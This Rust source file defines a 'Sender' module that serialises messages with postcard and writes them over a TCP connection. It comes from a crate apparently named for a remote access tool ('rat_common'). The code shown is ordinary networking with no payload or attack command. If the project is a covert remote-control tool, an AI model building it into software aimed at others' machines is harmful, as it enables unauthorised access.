use std::sync::Arc;

use async_trait::async_trait;
use rat_common::module::Module;
use rat_common::utils::acquire_free_mutex;
use tokio::io::AsyncWriteExt;
use tokio::net::tcp::OwnedWriteHalf;
use tokio::sync::{Mutex, SetOnce, mpsc};

use crate::messages::Message;

pub struct Sender {
    _tcp: Mutex<OwnedWriteHalf>,
    _receiver: Mutex<mpsc::Receiver<Message>>,
    _stopped: Arc<SetOnce<()>>,
}

impl Sender {
    pub fn new(tcp: OwnedWriteHalf, internal: mpsc::Receiver<Message>) -> Self {
        Self {
            _tcp: Mutex::new(tcp),
            _receiver: Mutex::new(internal),
            _stopped: Arc::new(SetOnce::new()),
        }
    }
}

#[async_trait]
impl Module for Sender {
    type EventType = Option<Message>;

    fn name(&self) -> &str {
        "Sender"
    }

    fn stopped(&self) -> Arc<SetOnce<()>> {
        self._stopped.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut receiver = acquire_free_mutex(&self._receiver);
        receiver.recv().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        if let Some(message) = event {
            let bytes = postcard::to_stdvec_cobs(&message)?;

            let mut tcp = acquire_free_mutex(&self._tcp);
            if let Err(e) = tcp.write_all(&bytes).await {
                self.stop();
                return Err(e.into());
            }
        }

        Ok(())
    }
}
